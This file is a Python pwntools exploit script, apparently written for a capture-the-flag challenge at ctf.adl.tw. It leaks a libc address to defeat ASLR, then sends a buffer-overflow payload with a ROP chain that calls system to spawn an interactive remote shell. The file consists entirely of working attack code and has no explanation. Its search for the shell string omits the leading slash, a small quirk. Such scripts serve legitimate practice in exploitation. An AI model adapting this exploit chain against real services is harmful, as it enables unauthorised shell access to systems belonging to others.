from pwn import *
from Crypto.Util.number import *

libc = ELF('libc.so.6')###############3#####################################

system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b'bin/sh'))
_IO_2_1_stdin_offset = libc.symbols['_IO_2_1_stdin_']
p = remote('ctf.adl.tw',11004)
ASLR_IO_2_1_stdin_offset = p.recvline()[:8]
ASLR_IO_2_1_stdin_offset = int.from_bytes(ASLR_IO_2_1_stdin_offset,'little')
libc_base = ASLR_IO_2_1_stdin_offset - _IO_2_1_stdin_offset
libc_pop_rdi = 0x000000000002155f
xor_rax = 0x00000000000b17c5
bof_offset = cyclic_find('saaa')
payload = (b"A"*bof_offset+p64(libc_base+ libc_pop_rdi)+p64(libc_base+binsh_offset)+p64(xor_rax+ libc_base)+p64(libc_base+ system_offset))
open('payload.txt','wb').write(payload)
p.sendline(payload)
p.interactive()
